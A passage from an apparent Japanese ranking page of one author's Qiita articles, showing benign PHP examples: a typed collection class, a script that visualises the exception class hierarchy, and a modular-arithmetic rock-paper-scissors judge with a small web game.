<span id="オブジェクト" class="fragment"></span><a href="#%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>オブジェクト</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_OBJECT</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimpleXMLElement</span><span class="p">(</span><span class="s1">'&lt;xml&gt;&lt;/xml&gt;'</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="k">stdClass</span><span class="p">;</span>
</pre></div></div>

<h3>
<span id="特定のオブジェクト" class="fragment"></span><a href="#%E7%89%B9%E5%AE%9A%E3%81%AE%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88"><i class="fa fa-link"></i></a>特定のオブジェクト</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_OBJECT</span><span class="p">,</span> <span class="s1">'stdClass'</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="k">stdClass</span><span class="p">;</span>
</pre></div></div>

<h3>
<span id="特定のリソース" class="fragment"></span><a href="#%E7%89%B9%E5%AE%9A%E3%81%AE%E3%83%AA%E3%82%BD%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>特定のリソース</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_RESOURCE</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="s1">'stream'</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'test.txt'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="文字列にキャスト可能なもの" class="fragment"></span><a href="#%E6%96%87%E5%AD%97%E5%88%97%E3%81%AB%E3%82%AD%E3%83%A3%E3%82%B9%E3%83%88%E5%8F%AF%E8%83%BD%E3%81%AA%E3%82%82%E3%81%AE"><i class="fa fa-link"></i></a>文字列にキャスト可能なもの</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$array</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_STRINGABLE</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'test.txt'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">);</span>
<span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SimpleXMLElement</span><span class="p">(</span><span class="s1">'&lt;xml&gt;&lt;/xml&gt;'</span><span class="p">);</span>
</pre></div></div>

<h2>
<span id="再帰的な定義" class="fragment"></span><a href="#%E5%86%8D%E5%B8%B0%E7%9A%84%E3%81%AA%E5%AE%9A%E7%BE%A9"><i class="fa fa-link"></i></a>再帰的な定義</h2>

<p><strong>Collection</strong> を再帰的に代入していけば、Javaの <strong>ジェネリクス</strong> みたいなことがPHPでも出来るように！</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$root</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_OBJECT</span><span class="p">,</span> <span class="s1">'Collection'</span><span class="p">);</span>
<span class="nv">$root</span><span class="p">[</span><span class="s1">'int'</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_INT</span><span class="p">);</span>
<span class="nv">$root</span><span class="p">[</span><span class="s1">'bool'</span><span class="p">]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Collection</span><span class="p">(</span><span class="nx">Collection</span><span class="o">::</span><span class="na">TYPE_BOOL</span><span class="p">);</span>
<span class="nv">$root</span><span class="p">[</span><span class="s1">'int'</span><span class="p">][]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nv">$root</span><span class="p">[</span><span class="s1">'bool'</span><span class="p">][]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</pre></div></div>

<p>…よく考えたら <strong>new</strong> でインスタンス生成するタイミングで全ての再帰的な定義が終わってないとだめだよね……うーん………所詮はPHPか…………</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />46位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>21</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/6b10658f29054157017c">例外の継承関係を可視化するショートコード</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2014-03-26 19:07:35</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[例外]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">ソースコード</span></div>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$lines</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nb">preg_grep</span><span class="p">(</span><span class="s1">'/Exception\z/i'</span><span class="p">,</span> <span class="nb">get_declared_classes</span><span class="p">())</span> <span class="k">as</span> <span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$classes</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="nv">$classes</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$class</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$class</span> <span class="o">=</span> <span class="nb">get_parent_class</span><span class="p">(</span><span class="nv">$class</span><span class="p">));</span>
    <span class="nv">$lines</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">' -&gt; '</span><span class="p">,</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$classes</span><span class="p">));</span>
<span class="p">}</span>
<span class="nb">sort</span><span class="p">(</span><span class="nv">$lines</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">implode</span><span class="p">(</span><span class="nx">PHP_EOL</span><span class="p">,</span> <span class="nv">$lines</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="scala">
<div class="code-lang"><span class="bold">実行結果の例</span></div>
<div class="highlight"><pre><span></span><span class="nc">Exception</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">DOMException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">ErrorException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">BadFunctionCallException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">BadFunctionCallException</span> <span class="o">-&gt;</span> <span class="nc">BadMethodCallException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">DomainException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">InvalidArgumentException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">LengthException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">OutOfRangeException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">PharException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">ReflectionException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">OutOfBoundsException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">OverflowException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">PDOException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">RangeException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">UnderflowException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">UnexpectedValueException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="n">mysqli_sql_exception</span>
</pre></div>
</div>

<h4>
<span id="php言語自体の開発者に言いたい文句" class="fragment"></span><a href="#php%E8%A8%80%E8%AA%9E%E8%87%AA%E4%BD%93%E3%81%AE%E9%96%8B%E7%99%BA%E8%80%85%E3%81%AB%E8%A8%80%E3%81%84%E3%81%9F%E3%81%84%E6%96%87%E5%8F%A5"><i class="fa fa-link"></i></a>PHP言語自体の開発者に言いたい文句</h4>

<ul>
<li>なんで <strong>IOException</strong> って存在しないの</li>
<li>
<strong>IOException</strong> が無いなら <strong>Exception</strong> とすべきところをなんで <a href="http://www.php.net/manual/ja/splfileobject.construct.php#refsect1-splfileobject.construct-errors" rel="nofollow noopener" target="_blank"><strong>RuntimeException</strong> を投げる</a> の</li>
<li>何で <strong>mysqli_sql_exception</strong> だけスネークケースなの</li>
<li>何で固有例外クラスのうち <strong>PDOException</strong> と <strong>mysqli_sql_exception</strong> だけが <strong>RuntimeException</strong> を継承してるの</li>
</ul>

<div class="code-frame" data-lang="scala">
<div class="code-lang"><span class="bold">個人的にこうあってほしい</span></div>
<div class="highlight"><pre><span></span><span class="nc">Exception</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">DatabaseException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">DatabaseException</span> <span class="o">-&gt;</span> <span class="nc">MysqliExeption</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">DatabaseException</span> <span class="o">-&gt;</span> <span class="nc">PDOException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">DOMException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">ErrorException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">IOException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">BadFunctionCallException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">BadFunctionCallException</span> <span class="o">-&gt;</span> <span class="nc">BadMethodCallException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">DomainException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">InvalidArgumentException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">LengthException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">LogicException</span> <span class="o">-&gt;</span> <span class="nc">OutOfRangeException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">PharException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">ReflectionException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">OutOfBoundsException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">OverflowException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">RangeException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">UnderflowException</span>
<span class="nc">Exception</span> <span class="o">-&gt;</span> <span class="nc">RuntimeException</span> <span class="o">-&gt;</span> <span class="nc">UnexpectedValueException</span>
</pre></div>
</div>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />47位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>20</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/3ffaac0f1b4a7713c869">じゃんけんアルゴリズムをちょっと応用</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-10-27 19:20:14</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> <b>[アルゴリズム]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="じゃんけんの勝敗判定" class="fragment"></span><a href="#%E3%81%98%E3%82%83%E3%82%93%E3%81%91%E3%82%93%E3%81%AE%E5%8B%9D%E6%95%97%E5%88%A4%E5%AE%9A"><i class="fa fa-link"></i></a>じゃんけんの勝敗判定</h1>

<h2>
<span id="グーチョキパーの3種類で判定" class="fragment"></span><a href="#%E3%82%B0%E3%83%BC%E3%83%81%E3%83%A7%E3%82%AD%E3%83%91%E3%83%BC%E3%81%AE3%E7%A8%AE%E9%A1%9E%E3%81%A7%E5%88%A4%E5%AE%9A"><i class="fa fa-link"></i></a>グー・チョキ・パーの3種類で判定</h2>

<h4>
<span id="じゃんけん勝敗判定アルゴリズムの思い出" class="fragment"></span><a href="#%E3%81%98%E3%82%83%E3%82%93%E3%81%91%E3%82%93%E5%8B%9D%E6%95%97%E5%88%A4%E5%AE%9A%E3%82%A2%E3%83%AB%E3%82%B4%E3%83%AA%E3%82%BA%E3%83%A0%E3%81%AE%E6%80%9D%E3%81%84%E5%87%BA"><i class="fa fa-link"></i></a><a href="http://staku.designbits.jp/check-janken/" rel="nofollow noopener" target="_blank">じゃんけん勝敗判定アルゴリズムの思い出</a>
</h4>

<p>こちらの記事を参考にさせていただきました。</p>

<p><strong>グー = 0</strong><br>
<strong>チョキ = 1</strong><br>
<strong>パー = 2</strong></p>

<p>として、</p>

<p><strong>(自分の手 - 相手の手 + 3) % 3</strong></p>

<p>の値を見て</p>

<p><strong>0 = 引き分け</strong><br>
<strong>1 = 負け</strong><br>
<strong>2 = 勝ち</strong></p>

<p>というものです。<br>
数学に強い人なら何も説明しなくても「あーなるほど」と分かると思います。</p>

<h4>
<span id="自分が勝つとき" class="fragment"></span><a href="#%E8%87%AA%E5%88%86%E3%81%8C%E5%8B%9D%E3%81%A4%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>自分が勝つとき</h4>

<table>
<thead>
<tr>
<th style="text-align: right">自分</th>
<th style="text-align: right">相手</th>
<th style="text-align: right">差</th>
<th style="text-align: right">差 + 3</th>
<th style="text-align: right">(差 + 3) % 3</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: right">0</td>
<td style="text-align: right">1</td>
<td style="text-align: right">-1</td>
<td style="text-align: right">2</td>
<td style="text-align: right">2</td>
</tr>
<tr>
<td style="text-align: right">1</td>
<td style="text-align: right">2</td>
<td style="text-align: right">-1</td>
<td style="text-align: right">2</td>
<td style="text-align: right">2</td>
</tr>
<tr>
<td style="text-align: right">2</td>
<td style="text-align: right">0</td>
<td style="text-align: right">2</td>
<td style="text-align: right">5</td>
<td style="text-align: right">2</td>
</tr>
</tbody>
</table>

<h4>
<span id="自分が負けるとき" class="fragment"></span><a href="#%E8%87%AA%E5%88%86%E3%81%8C%E8%B2%A0%E3%81%91%E3%82%8B%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>自分が負けるとき</h4>

<table>
<thead>
<tr>
<th style="text-align: right">自分</th>
<th style="text-align: right">相手</th>
<th style="text-align: right">差</th>
<th style="text-align: right">差 + 3</th>
<th style="text-align: right">(差 + 3) % 3</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: right">0</td>
<td style="text-align: right">2</td>
<td style="text-align: right">-2</td>
<td style="text-align: right">1</td>
<td style="text-align: right">1</td>
</tr>
<tr>
<td style="text-align: right">1</td>
<td style="text-align: right">0</td>
<td style="text-align: right">1</td>
<td style="text-align: right">4</td>
<td style="text-align: right">1</td>
</tr>
<tr>
<td style="text-align: right">2</td>
<td style="text-align: right">1</td>
<td style="text-align: right">1</td>
<td style="text-align: right">4</td>
<td style="text-align: right">1</td>
</tr>
</tbody>
</table>

<h4>
<span id="引き分けのとき" class="fragment"></span><a href="#%E5%BC%95%E3%81%8D%E5%88%86%E3%81%91%E3%81%AE%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>引き分けのとき</h4>

<table>
<thead>
<tr>
<th style="text-align: right">自分</th>
<th style="text-align: right">相手</th>
<th style="text-align: right">差</th>
<th style="text-align: right">差 + 3</th>
<th style="text-align: right">(差 + 3) % 3</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: right">0</td>
<td style="text-align: right">0</td>
<td style="text-align: right">0</td>
<td style="text-align: right">3</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: right">1</td>
<td style="text-align: right">1</td>
<td style="text-align: right">0</td>
<td style="text-align: right">3</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: right">2</td>
<td style="text-align: right">2</td>
<td style="text-align: right">0</td>
<td style="text-align: right">3</td>
<td style="text-align: right">0</td>
</tr>
</tbody>
</table>

<h2>
<span id="グーチョキパー皇帝奴隷の5種類で判定" class="fragment"></span><a href="#%E3%82%B0%E3%83%BC%E3%83%81%E3%83%A7%E3%82%AD%E3%83%91%E3%83%BC%E7%9A%87%E5%B8%9D%E5%A5%B4%E9%9A%B7%E3%81%AE5%E7%A8%AE%E9%A1%9E%E3%81%A7%E5%88%A4%E5%AE%9A"><i class="fa fa-link"></i></a>グー・チョキ・パー・皇帝・奴隷の5種類で判定</h2>

<h4>
<span id="皇帝" class="fragment"></span><a href="#%E7%9A%87%E5%B8%9D"><i class="fa fa-link"></i></a>皇帝</h4>

<ul>
<li>基本勝つ</li>
<li>但し <strong>奴隷</strong> だけには負ける</li>
</ul>

<h4>
<span id="奴隷" class="fragment"></span><a href="#%E5%A5%B4%E9%9A%B7"><i class="fa fa-link"></i></a>奴隷</h4>

<ul>
<li>基本負ける</li>
<li>但し <strong>皇帝</strong> だけには勝てる</li>
</ul>

<p>というルールを採用したとき。<br>
（手をどんな形にするのか知らないが）</p>

<p><strong>グー = 0</strong><br>
<strong>チョキ = 1</strong><br>
<strong>パー = 2</strong><br>
<strong>奴隷 = 3</strong><br>
<strong>皇帝 = 6</strong></p>

<h4>
<span id="1-自分か相手に皇帝奴隷が含まれているかチェック" class="fragment"></span><a href="#1-%E8%87%AA%E5%88%86%E3%81%8B%E7%9B%B8%E6%89%8B%E3%81%AB%E7%9A%87%E5%B8%9D%E5%A5%B4%E9%9A%B7%E3%81%8C%E5%90%AB%E3%81%BE%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8B%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF"><i class="fa fa-link"></i></a>1. 自分か相手に皇帝・奴隷が含まれているかチェック。</h4>

<p>含まれていなければ通常通り処理をして結果を返す。</p>

<h4>
<span id="2-それぞれの手を-3で割って小数点以下を切り捨てる-" class="fragment"></span><a href="#2-%E3%81%9D%E3%82%8C%E3%81%9E%E3%82%8C%E3%81%AE%E6%89%8B%E3%82%92-3%E3%81%A7%E5%89%B2%E3%81%A3%E3%81%A6%E5%B0%8F%E6%95%B0%E7%82%B9%E4%BB%A5%E4%B8%8B%E3%82%92%E5%88%87%E3%82%8A%E6%8D%A8%E3%81%A6%E3%82%8B-"><i class="fa fa-link"></i></a>2. それぞれの手を <strong>3で割って小数点以下を切り捨てる</strong> 。</h4>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$you</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$you</span> <span class="o">/</span> <span class="mi">3</span><span class="p">);</span>
<span class="nv">$com</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$com</span> <span class="o">/</span> <span class="mi">3</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="3-通常通り判定する" class="fragment"></span><a href="#3-%E9%80%9A%E5%B8%B8%E9%80%9A%E3%82%8A%E5%88%A4%E5%AE%9A%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>3. 通常通り判定する</h3>

<p>通常時</p>

<table>
<thead>
<tr>
<th style="text-align: left">手</th>
<th style="text-align: right">記号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">グー</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">チョキ</td>
<td style="text-align: right">1</td>
</tr>
<tr>
<td style="text-align: left">パー</td>
<td style="text-align: right">2</td>
</tr>
</tbody>
</table>

<p>3で割ったとき</p>

<table>
<thead>
<tr>
<th style="text-align: left">手</th>
<th style="text-align: right">記号</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">グー・チョキ・パー</td>
<td style="text-align: right">0</td>
</tr>
<tr>
<td style="text-align: left">奴隷</td>
<td style="text-align: right">1</td>
</tr>
<tr>
<td style="text-align: left">皇帝</td>
<td style="text-align: right">2</td>
</tr>
</tbody>
</table>

<p>通常時の処理をそのまま適用しても正しく判定出来ることが分かります。</p>

<h1>
<span id="phpでの実装例" class="fragment"></span><a href="#php%E3%81%A7%E3%81%AE%E5%AE%9F%E8%A3%85%E4%BE%8B"><i class="fa fa-link"></i></a>PHPでの実装例</h1>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="c1">// 勝敗判定関数</span>
<span class="k">function</span> <span class="nf">battle</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="o">||</span> <span class="nv">$b</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$a</span> <span class="o">/</span> <span class="mi">3</span><span class="p">);</span>
        <span class="nv">$b</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$b</span> <span class="o">/</span> <span class="mi">3</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">-</span> <span class="nv">$b</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">%</span> <span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// 手のリスト</span>
<span class="nv">$hand_list</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'グー'</span><span class="p">,</span>
    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'チョキ'</span><span class="p">,</span>
    <span class="mi">2</span> <span class="o">=&gt;</span> <span class="s1">'パー'</span><span class="p">,</span>
    <span class="mi">3</span> <span class="o">=&gt;</span> <span class="s1">'奴隷'</span><span class="p">,</span>
    <span class="mi">6</span> <span class="o">=&gt;</span> <span class="s1">'皇帝'</span><span class="p">,</span>
<span class="p">);</span>

<span class="c1">// 結果リスト</span>
<span class="nv">$result_list</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="mi">2</span> <span class="o">=&gt;</span> <span class="s1">'あなたの勝ちです'</span><span class="p">,</span>
    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'あなたの負けです'</span><span class="p">,</span>
    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="s1">'あいこです'</span><span class="p">,</span>
    <span class="o">-</span><span class="mi">1</span> <span class="o">=&gt;</span> <span class="s1">'不明'</span><span class="p">,</span>
<span class="p">);</span>

<span class="c1">// 手が送信されたとき勝負を実行</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'you'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// 整数型にキャスト(不正な値をエラー無しに防ぐ効果もある)</span>
    <span class="nv">$you</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'you'</span><span class="p">];</span>
    <span class="c1">// コンピュータの手を選出</span>
    <span class="nv">$com</span> <span class="o">=</span> <span class="nb">array_rand</span><span class="p">(</span><span class="nv">$hand_list</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$hand_list</span><span class="p">[</span><span class="nv">$you</span><span class="p">]))</span> <span class="p">{</span>
        <span class="c1">// 不正な値のときは自分の手を「？」、結果を「不明」にする</span>
        <span class="nv">$hand_list</span><span class="p">[</span><span class="nv">$you</span> <span class="o">=</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'？'</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="c1">// 正しい値のときは関数に渡す</span>
        <span class="nv">$result</span> <span class="o">=</span> <span class="nx">battle</span><span class="p">(</span><span class="nv">$you</span><span class="p">,</span> <span class="nv">$com</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ヘッダー送信</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>じゃんけんゲーム<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">style</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/css"</span><span class="p">&gt;</span>
      <span class="nt">label</span> <span class="p">{</span> <span class="k">display</span><span class="p">:</span> <span class="kc">block</span><span class="p">;</span> <span class="p">}</span>
    <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
